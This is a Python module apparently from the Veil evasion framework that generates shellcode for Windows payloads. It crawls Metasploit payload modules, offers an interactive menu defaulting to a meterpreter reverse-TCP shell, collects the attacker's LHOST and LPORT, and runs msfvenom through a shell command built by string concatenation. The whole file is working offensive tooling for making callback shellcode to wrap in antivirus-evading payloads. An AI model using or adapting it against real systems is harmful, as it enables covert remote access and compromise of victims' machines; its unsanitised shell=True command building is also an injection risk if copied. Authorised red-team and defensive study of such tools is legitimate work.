"""
Contains main Shellcode class as well as the Completer class used
for tab completion of metasploit payload selection.
"""

# Import Modules
import socket
import os
import readline
import subprocess
import binascii
import sys

from lib.common import helpers
from tools.evasion.evasion_common import evasion_helpers
from lib.common import completer


# Try to find and import the settings.py config file
try:
    sys.path.append("/etc/veil/")
    import settings
except ImportError:
    print( "\n [!] ERROR #1-4: Can't import /etc/veil/settings.py.   Run: %s\n" % ( os.path.abspath( "./config/update-config.py" ) ) )
    sys.exit()


sys.path.insert(0, settings.VEIL_PATH + '/tools/ordnance')
import tool as ordnance_import


class Shellcode:
    """
    Class that represents a shellcode object, custom of msfvenom generated.

    """
    def __init__(self, cli_obj):
        # the nested dictionary passed to the completer
        self.payload_tree = {}
        # the entier msfvenom command that may be built
        self.msfvenomCommand = ""
        # any associated msfvenom options
        self.msfvenom_options = list()
        # in case user specifies a custom shellcode string
        self.custom_shellcode = ""
        # specific msfvenom payload specified
        self.msfvenompayload = ""
        # misc options
        self.options = list()
        # required options
        self.required_options = list()
        # load up all the metasploit modules available
        self.LoadModules()
        # Used when Ordnance generates shellcode
        self.invoke_ordnance = False
        self.ord_lhost = None
        self.ord_lport = None
        # Load cli options
        self.cli_options = cli_obj
        self.payload_choice = ""
        self.shellcode_options = ""

    def Reset(self):
        """
        reset the state of any internal variables, everything but self.payload_tree
        """
        self.msfvenomCommand = ""
        self.msfvenom_options = list()
        self.custom_shellcode = ""
        self.msfvenompayload = ""
        self.options = list()

    def LoadModules(self):
        """
        Crawls the metasploit install tree and extracts available payloads
        and their associated required options for languages specified.

        """

        # Variable changed for compatibility with non-root and non-Kali users
        # Thanks to Tim Medin for the patch
        msfFolder = settings.METASPLOIT_PATH

        # I can haz multiple platforms?
        platforms = ["windows"]

        for platform in platforms:
            self.payload_tree[platform] = {}

            stagesX86 = list()
            stagesX64 = list()

            # load up all the stages (meterpreter/vnc/etc.)
            # TODO: detect Windows and modify the paths appropriately
            for root, dirs, files in os.walk(settings.METASPLOIT_PATH + 'modules/payloads/stages/' + platform + '/'):
                for f in files:
                    stageName = f.split(".")[0]
                    if "x64" in root:
                        stagesX64.append(f.split(".")[0])
                        if "x64" not in self.payload_tree[platform]:
                            self.payload_tree[platform]["x64"] = {}
                        self.payload_tree[platform]["x64"][stageName] = {}
                    elif "x86" in root: # linux payload structure format
                        stagesX86.append(f.split(".")[0])
                        if "x86" not in self.payload_tree[platform]:
                            self.payload_tree[platform]["x86"] = {}
                        self.payload_tree[platform]["x86"][stageName] = {}
                    else: # windows payload structure format
                        stagesX86.append(f.split(".")[0])
                        if stageName not in self.payload_tree[platform]:
                            self.payload_tree[platform][stageName] = {}

            # load up all the stagers (reverse_tcp, bind_tcp, etc.)
            # TODO: detect Windows and modify the paths appropriately
            for root, dirs, files in os.walk(settings.METASPLOIT_PATH + 'modules/payloads/stagers/' + platform + '/'):
                for f in files:

                    if ".rb" in f:
                        extraOptions = list()
                        moduleName = f.split(".")[0]
                        lines = open(root + "/" + f).readlines()
                        for line in lines:
                            if "OptString" in line.strip() and "true" in line.strip():
                                cmd = line.strip().split(",")[0].replace("OptString.new(","")[1:-1]
                                extraOptions.append(cmd)
                        if "bind" in f:
                            if "x64" in root:
                                for stage in stagesX64:
                                    self.payload_tree[platform]["x64"][stage][moduleName] = ["LPORT"] + extraOptions
                            elif "x86" in root:
                                for stage in stagesX86:
                                    self.payload_tree[platform]["x86"][stage][moduleName] = ["LPORT"] + extraOptions
                            else:
                                for stage in stagesX86:
                                    self.payload_tree[platform][stage][moduleName] = ["LPORT"] + extraOptions
                        if "reverse" in f:
                            if "x64" in root:
                                for stage in stagesX64:
                                    self.payload_tree[platform]["x64"][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions
                            elif "x86" in root:
                                for stage in stagesX86:
                                    self.payload_tree[platform]["x86"][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions
                            else:
                                for stage in stagesX86:
                                    self.payload_tree[platform][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions

            # load up any payload singles
            # TODO: detect Windows and modify the paths appropriately
            for root, dirs, files in os.walk(settings.METASPLOIT_PATH + 'modules/payloads/singles/' + platform + '/'):
                for f in files:

                    if ".rb" in f:

                        with open(root + "/" + f) as ruby_file:
                            lines = ruby_file.readlines()
                        totalOptions = list()
                        moduleName = f.split(".")[0]

                        for line in lines:
                            if "OptString" in line.strip() and "true" in line.strip():
                                cmd = line.strip().split(",")[0].replace("OptString.new(","")[1:-1]
                                totalOptions.append(cmd)
                        if "bind" in f:
                            totalOptions.append("LPORT")
                        if "reverse" in f:
                            totalOptions.append("LHOST")
                            totalOptions.append("LPORT")
                        if "x64" in root:
                            self.payload_tree[platform]["x64"][moduleName] = totalOptions
                        elif "x86" in root:
                            self.payload_tree[platform]["x86"][moduleName] = totalOptions
                        else:
                            self.payload_tree[platform][moduleName] = totalOptions
        return

    def payload_selection_menu(self, showTitle=True):
        """
        Menu to prompt the user for a custom shellcode string.

        Returns None if nothing is specified.
        """

        # print out the main title to reset the interface
        if showTitle:
            evasion_helpers.title_screen()
        else:
            print()

        print(helpers.color(" [?] Generate or supply custom shellcode?\n"))
        print('     %s - Ordnance %s' % (helpers.color('1'), helpers.color('(default)', yellow=True)))
        print('     %s - MSFVenom' % (helpers.color('2')))
        print('     %s - Custom shellcode string' % (helpers.color('3')))
        print('     %s - File with shellcode (\\x41\\x42..)' % (helpers.color('4')))
        print('     %s - Binary file with shellcode\n' % helpers.color('5'))

        try:
            choice = self.required_options['SHELLCODE'][0].lower().strip()
            print(" [>] Please enter the number of your choice: %s" % (choice))
        except:
            choice = input(" [>] Please enter the number of your choice: ").strip()

        if choice == '4':
            # instantiate our completer object for path completion
            comp = completer.PathCompleter()

            # we want to treat '/' as part of a word, so override the delimiters
            readline.set_completer_delims(' \t\n;')
            readline.parse_and_bind("tab: complete")
            readline.set_completer(comp.complete)

            # if the shellcode is specicified as a raw file
            filePath = input(" [>] Please enter the path to your shellcode file: ")

            try:
                with open(filePath, 'r') as shellcode_file:
                    file_shellcode = shellcode_file.read()
                    file_shellcode = file_shellcode.strip()
            except:
                print(helpers.color(" [!] WARNING: path not found, defaulting to msfvenom!", warning=True))
                return None

            if len(file_shellcode) == 0:
                print(helpers.color(" [!] WARNING: no custom shellcode restrieved, defaulting to msfvenom!", warning=True))
                return None

            # check if the shellcode was passed in as string-escaped form
            if file_shellcode[0:2] == "\\x" and file_shellcode[4:6] == "\\x":
                return file_shellcode
            else:
                # otherwise encode the raw data as a hex string
                hexString = binascii.hexlify(file_shellcode)
                file_shellcode = "\\x"+"\\x".join([hexString[i:i + 2] for i in range(0, len(hexString), 2)])
                return file_shellcode

            # remove the completer
            readline.set_completer(None)

        elif choice == '5':
            # instantiate our completer object for path completion
            comp = completer.PathCompleter()

            # we want to treat '/' as part of a word, so override the delimiters
            readline.set_completer_delims(' \t\n;')
            readline.parse_and_bind("tab: complete")
            readline.set_completer(comp.complete)

            # if the shellcode is specicified as a raw file
            filePath = input(" [>] Please enter the path to your binary file: ")

            try:
                with open(filePath, 'rb') as shellcode_file:
                    file_shellcode = shellcode_file.read()

            except:
                print(helpers.color(" [!] WARNING: path not found, defaulting to msfvenom!", warning=True))
                return None

            if len(file_shellcode) == 0:
                print(helpers.color(" [!] WARNING: no custom shellcode restrieved, defaulting to msfvenom!", warning=True))
                return None

            binary_code = ""
            # Convert from binary to shellcode
            for byte in file_shellcode:
                binary_code += "\\x" + hex(byte)[2:].zfill(2)
            return binary_code

        elif choice == '3' or choice == 'string':
            # if the shellcode is specified as a string
            cust_sc = input(" [>] Please enter custom shellcode (one line, no quotes, \\x00.. format): ")
            if len(cust_sc) == 0:
                print(helpers.color(" [!] WARNING: no shellcode specified, defaulting to msfvenom!", warning=True))
            return cust_sc

        elif choice == '' or choice == '1' or choice.lower() == 'veil-ordnance' or choice.lower() == 'ordnance':
            return 'ordnance'

        elif choice == '2' or choice.lower() == 'msf' or choice.lower() == 'metasploit' or choice.lower() == 'msfvenom':
            return None

        else:
            print(helpers.color(" [!] WARNING: Invalid option chosen, defaulting to Ordnance!", warning=True))
            return 'ordnance'

    def menu(self):
        """
        Main interactive menu for shellcode selection.

        Utilizes Completer() to do tab completion on
        loaded metasploit payloads.
        """
        selected_payload = None
        options = None
        showMessage = False
        if settings.TERMINAL_CLEAR != "false":
            showMessage = True

        # if no generation method has been selected yet
        if self.msfvenomCommand == '' and self.custom_shellcode == '':

            # show banner?
            if settings.TERMINAL_CLEAR != "false":
                showMessage = True

            # prompt for custom shellcode or msfvenom
            custom_shellcode = self.payload_selection_menu(showMessage)

            # if custom shellcode is specified, set it
            if custom_shellcode == "ordnance":
                # Start figuring out Ordnance stuff here
                self.invoke_ordnance = True

            elif custom_shellcode:
                self.custom_shellcode = custom_shellcode

            # else, if no custom shellcode is specified, prompt for metasploit
            else:

                # instantiate our completer object for tab completion of available payloads
                comp = completer.MSFCompleter(self.payload_tree)

                # we want to treat '/' as part of a word, so override the delimiters
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(comp.complete)

                # have the user select the payload
                while selected_payload is None:

                    print('\n [*] Press %s for windows/meterpreter/reverse_tcp' % helpers.color('[enter]', yellow=True))
                    print(' [*] Press %s to list available payloads' % helpers.color('[tab]', yellow=True))

                    try:
                        selected_payload = self.required_options['MSF_PAYLOAD'][0]
                        print(' [>] Please enter metasploit payload: %s' % (selected_payload))
                    except:
                        selected_payload = input(' [>] Please enter metasploit payload: ').strip().lower()

                    if selected_payload == '':
                        # default to reverse_tcp for the payload
                        selected_payload = "windows/meterpreter/reverse_tcp"
                    try:
                        parts = selected_payload.split("/")
                        # walk down the selected parts of the payload tree to get to the options at the bottom
                        options = self.payload_tree
                        for part in parts:
                            options = options[part]

                    except KeyError:
                        # make sure user entered a valid payload
                        if 'PAYLOAD' in self.required_options:
                            del self.required_options['PAYLOAD']
                        print(helpers.color(" [!] ERROR: Invalid payload specified!\n", warning=True))
                        selected_payload = None

                # remove the tab completer
                readline.set_completer(None)

                # set the internal payload to the one selected
                self.msfvenompayload = selected_payload

                # request a value for each required option
                for option in options:
                    value = ""
                    while value == '':

                        ### VALIDATION ###
                        # LHOST is a special case, so we can tab complete the local IP
                        if option == "LHOST":

                            try:
                                value = self.required_options['LHOST'][0]
                                print(' [>] Enter value for \'LHOST\', [tab] for local IP: %s' % (value))
                            except:
                                # set the completer to fill in the local IP
                                readline.set_completer(completer.IPCompleter().complete)
                                value = input(' [>] Enter value for \'LHOST\', [tab] for local IP: ').strip()

                            if '.' in value:

                                hostParts = value.split(".")
                                if len(hostParts) > 1:

                                    # if the last chunk is a number, assume it's an IP address
                                    if hostParts[-1].isdigit():

                                        # do a IP validation check
                                        if not helpers.validate_ip(value):
                                            if 'LHOST' in self.required_options:
                                                self.required_options['LHOST'][0] = ""
                                            print(helpers.color("\n [!] ERROR: Bad IP address specified.\n", warning=True))
                                            value = ""

                                    # otherwise assume we've been passed a domain name
                                    else:
                                        if not helpers.validate_hostname(value):
                                            if 'LHOST' in self.required_options:
                                                self.required_options['LHOST'][0] = ""
                                            print(helpers.color("\n [!] ERROR: Bad hostname specified.\n", warning=True))
                                            value = ""

                                # if we don't have at least one period in the hostname/IP
                                else:
                                    if 'LHOST' in self.required_options:
                                        del self.required_options['LHOST']
                                    print(helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True))
                                    value = ""

                            elif ':' in value:
                                try:
                                    socket.inet_pton(socket.AF_INET6, value)
                                except socket.error:
                                    if 'LHOST' in self.required_options:
                                        self.required_options['LHOST'][0] = ""
                                    print(helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True))
                                    value = ""

                            else:
                                if 'LHOST' in self.required_options:
                                    self.required_options['LHOST'][0] = ""
                                print(helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True))
                                value = ""

                        elif option == "LPORT":
                            try:
                                value = self.required_options['LPORT'][0]
                                print(' [>] Enter value for \'LPORT\': %s' % (value))
                            except:
                                # set the completer to fill in the default MSF port (4444)
                                readline.set_completer(completer.MSFPortCompleter().complete)
                                value = input(' [>] Enter value for \'LPORT\': ').strip()

                            try:
                                if int(value) <= 0 or int(value) >= 65535:
                                    print(helpers.color(" [!] ERROR: Bad port number specified.\n", warning=True))
                                    if 'LPORT' in self.required_options:
                                        self.required_options['LPORT'][0] = ""
                                    value = ""
                            except ValueError:
                                print(helpers.color(" [!] ERROR: Bad port number specified.\n", warning=True))
                                if 'LPORT' in self.required_options:
                                    self.required_options['LPORT'][0] = ""
                                value = ""

                        else:
                            value = input(' [>] Enter value for \'' + option + '\': ').strip()

                    # append all the msfvenom options
                    self.msfvenom_options.append(option + "=" + value)

                # allow the user to input any extra OPTION=value pairs
                extra_msf_options = list()
                while True:
                    # clear out the tab completion
                    readline.set_completer(completer.none().complete)
                    selection = input(' [>] Enter any extra msfvenom options (syntax: OPTION1=value1 or -OPTION2=value2): ').strip()
                    if selection != '':
                        num_extra_options = selection.split(' ')
                        for xtra_opt in num_extra_options:
                            if xtra_opt != '':
                                if "=" not in xtra_opt:
                                    print(helpers.color(" [!] Parameter not entered in correct syntax.\n", warning=True))
                                    continue
                                if "-" in xtra_opt.split('=')[0]:
                                    final_opt = xtra_opt.split('=')[0] + " " + xtra_opt.split('=')[1]
                                    extra_msf_options.append(final_opt)
                                else:
                                    final_opt = xtra_opt.split('=')[0] + "=" + xtra_opt.split('=')[1]
                                    extra_msf_options.append(final_opt)
                    else:
                        break

                # grab any specified msfvenom options in the /etc/veil/settings.py file
                msfvenom_options = ""
                if hasattr(settings, "MSFVENOM_OPTIONS"):
                    msfvenom_options = settings.MSFVENOM_OPTIONS

                # build out the msfvenom command
                self.msfvenomCommand = "msfvenom " + msfvenom_options + " -p " + selected_payload
                for option in self.msfvenom_options:
                    self.msfvenomCommand += " " + option
                    self.options.append(option)
                if len(extra_msf_options) != 0:
                    self.msfvenomCommand += " " + " ".join(extra_msf_options)
                self.msfvenomCommand += " -f c | tr -d \'\"\' | tr -d \'\\n\'"
                return

    def generate(self, required_options=None):
        """
        Based on the options set by menu() or SetPayload()
        either returns the custom shellcode string or calls msfvenom
        and returns the result.

        Returns the shellcode string for this object.
        """

        self.required_options = required_options

        # if the msfvenom command nor shellcode are set, revert to the
        # interactive menu to set any options
        if self.msfvenomCommand == '' and self.custom_shellcode == '':
            self.menu()

        # return custom specified shellcode if it was set previously
        if self.custom_shellcode != '':
            print(helpers.color("\n [*] Using pre-generated shellcode..."))
            return self.custom_shellcode

        elif self.invoke_ordnance:
            print(helpers.color("\n [*] Generating shellcode using Veil-Ordnance..."))
            ordnance_loop = True
            Ordnance_object = ordnance_import.Tools()
            while ordnance_loop:
                Ordnance_object.tool_main_menu(invoked=True)
                if Ordnance_object.final_shellcode != '':
                    self.payload_choice = Ordnance_object.selected_payload
                    self.shellcode_options = Ordnance_object.payload_options
                    ordnance_loop = False
            return Ordnance_object.final_shellcode

        # generate the shellcode using msfvenom
        else:
            print(helpers.color("\n [*] Generating shellcode using msfvenom..."))
            if self.msfvenomCommand == '':
                print(helpers.color(" [!] ERROR: msfvenom command not specified in payload!\n", warning=True))
                return None
            else:
                # Strip out extra characters, new lines, etc., just leave the shellcode.
                # Tim Medin's patch for non-root non-Kali users

                msfvenom_shellcode = subprocess.check_output(settings.MSFVENOM_PATH + self.msfvenomCommand, shell=True)
                self.shellcode_options = self.msfvenomCommand
                msfvenom_shellcode = msfvenom_shellcode.decode('ascii')
                self.msfvenomCommand = ""

                return msfvenom_shellcode[22:-1].strip()


def cli_msf_shellcode_gen(command_line_args):
    # set variables for values for easier readability
    msf_payload = command_line_args.msfvenom
    ip = command_line_args.ip
    port = command_line_args.port

    # Parse extra flags to be included in msfvenom command
    extra_options = ""
    if command_line_args.msfoptions is not None:
        num_extra_options = command_line_args.msfoptions.split(' ')
        for xtra_opt in num_extra_options:
            if xtra_opt != '':
                if "=" not in xtra_opt:
                    print(helpers.color(" [!] Parameter not entered in correct syntax.\n", warning=True))
                    sys.exit()
                if "-" in xtra_opt.split('=')[0]:
                    final_opt = xtra_opt.split('=')[0] + "=" + xtra_opt.split('=')[1]
                    extra_options += ' ' + final_opt
                else:
                    final_opt = xtra_opt.split('=')[0] + "=" + xtra_opt.split('=')[1]
                    extra_options += ' ' + final_opt

    # generate the msfvenom command
    msf_command = settings.MSFVENOM_PATH + 'msfvenom -p ' + msf_payload + ' '
    msf_command += "LHOST=" + ip + " LPORT=" + str(port)
    if extra_options != '':
        msf_command += extra_options
    # add final part to command to narrow down the msf output
    msf_command += " -f c | tr -d \'\"\' | tr -d \'\\n\'"

    # Run the command and get output
    msfvenom_shellcode = subprocess.check_output(msf_command, shell=True)
    msfvenom_shellcode = msfvenom_shellcode.decode('ascii')
    return msfvenom_shellcode[22:-1].strip()
